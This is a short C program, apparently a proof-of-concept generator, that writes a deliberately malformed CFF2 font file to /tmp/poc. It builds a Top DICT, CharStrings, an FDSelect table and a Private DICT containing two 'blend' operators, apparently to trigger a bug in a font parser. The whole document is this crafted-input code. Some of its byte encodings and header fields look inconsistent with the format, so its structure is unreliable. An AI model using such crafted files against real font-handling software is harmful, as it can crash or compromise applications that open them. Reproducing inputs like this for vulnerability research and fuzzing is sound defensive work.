#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* CFF2 header: major=2, minor=0, hdrSize=4, offSize=1 */
    fputc(0x02, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);

    /* Top DICT starts at offset 4 */
    long top_start = ftell(f);

    /* ROS: push 0, 1, 0, operator 0x0C 0x1E */
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x1E, f);

    /* FDSelect placeholder: push offset, operator 0x0C 0x1B */
    long fd_op_pos = ftell(f);
    fputc(0x00, f); fputc(0x0C, f); fputc(0x1B, f);

    /* Private placeholder: push size, offset, operator 0x12 */
    long priv_op_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x12, f);

    /* CharStrings placeholder: 0x1C, 2-byte offset, 0x11 */
    long char_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); fputc(0x11, f);

    /* Global Subrs INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f);

    /* CharStrings INDEX */
    long char_off = ftell(f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x01, f); fputc(0x02, f);
    fputc(0x8B, f);

    /* FDSelect table: Format 0 */
    long fd_off = ftell(f);
    fputc(0x00, f);              /* format = 0 */
    fputc(0x00, f); fputc(0x01, f); /* nGlyphs = 1 */
    fputc(0x00, f);              /* fds[0] = 0 */

    /* Private DICT */
    long priv_off = ftell(f);
    fputc(0x00, f); fputc(0x0F, f); /* vsindex = 0 */
    /* First blend */
    fputc(0x01, f); fputc(0x02, f); fputc(0x03, f); fputc(0x04, f); fputc(0x05, f);
    fputc(0x01, f); fputc(0x16, f);
    /* Second blend */
    fputc(0x06, f); fputc(0x07, f); fputc(0x08, f); fputc(0x09, f); fputc(0x0A, f);
    fputc(0x01, f); fputc(0x16, f);

    long priv_sz = ftell(f) - priv_off;

    /* Patch FDSelect operator */
    fseek(f, fd_op_pos, SEEK_SET);
    fputc((unsigned char)fd_off, f);
    fputc(0x0C, f); fputc(0x1B, f);

    /* Patch Private operator */
    fseek(f, priv_op_pos, SEEK_SET);
    fputc((unsigned char)priv_sz, f);
    fputc((unsigned char)priv_off, f);
    fputc(0x12, f);

    /* Patch CharStrings operator */
    fseek(f, char_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((unsigned char)(char_off >> 8), f);
    fputc((unsigned char)(char_off & 0xFF), f);
    fputc(0x11, f);

    fclose(f);
    return 0;
}